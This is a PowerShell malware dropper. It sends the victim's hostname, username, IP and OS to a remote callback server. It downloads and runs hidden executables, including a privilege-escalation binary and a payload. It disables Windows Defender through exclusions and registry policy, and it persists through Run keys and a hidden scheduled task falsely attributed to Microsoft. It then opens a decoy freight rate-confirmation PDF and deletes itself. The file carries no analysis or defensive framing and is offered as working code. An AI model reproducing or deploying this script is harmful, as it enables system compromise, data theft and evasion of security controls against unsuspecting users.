$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}

$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
$srv='https://signindat.com'
$sources=@($srv,$gh)

$logPath="$env:TEMP\wmisrv.log"
function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }

$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
    }catch{}
}

_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
_log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

function _dl($n){
    foreach($src in $sources){
        try{
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData("$src/$n")
            _log "DL: $n $($d.Length)"
            return ,$d
        }catch{}
    }
    _log "DL: $n fail"
    return $null
}

function _run($n,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)
        Start-Process $p -WindowStyle Hidden
        _log "$s : $l ok"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _runArg($n,$a,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)
        Start-Process $p -ArgumentList $a -WindowStyle Hidden
        _log "$s : $l ok ($a)"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

if(-not $cbIsAdmin){
    _run 'ElevatorShellCode.exe' 'S1' 'elev'
    Start-Sleep 6
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    _log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
}

if($cbIsAdmin){
    try{
        $mp='Add-MpPreference'
        & $mp -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
        & $mp -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
        & $mp -ExclusionProcess 'wmisrv.exe' -ErrorAction SilentlyContinue
    }catch{}

    try{
        $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
        if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        $rtp="$dp\Real-Time Protection"
        if(-not(Test-Path $rtp)){New-Item -Path $rtp -Force|Out-Null}
        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    }catch{}

    _runArg 'update.exe' 'kill' 'S2' 'defkill'
    Start-Sleep 3
    _cb 'S2' 'ok' 'defender killed'
}else{
    _cb 'S2' 'skip' 'no admin'
}

$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspul.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue
}catch{}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue
    }catch{}

    $taskName='WindowsHealthMonitor'
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspul.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$env:TEMP\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
}

_cb 'S3' 'ok' 'persist ok'

_run 'PatchPulsaar.exe' 'S5' 'payload'

$pdf='Rate_Confirmation_LD-2026-0847.pdf'
$pdfPath="$env:USERPROFILE\Downloads\$pdf"
$pdfBytes=_dl $pdf
if($pdfBytes){
    [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)
    try{Start-Process $pdfPath;_cb 'S7' 'ok' 'pdf ok'}catch{_cb 'S7' 'warn' 'pdf open fail'}
}else{_cb 'S7' 'warn' 'pdf dl fail'}

Start-Sleep 5
Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
}

_log 'S9: done'
_cb 'S9' 'ok' 'done'
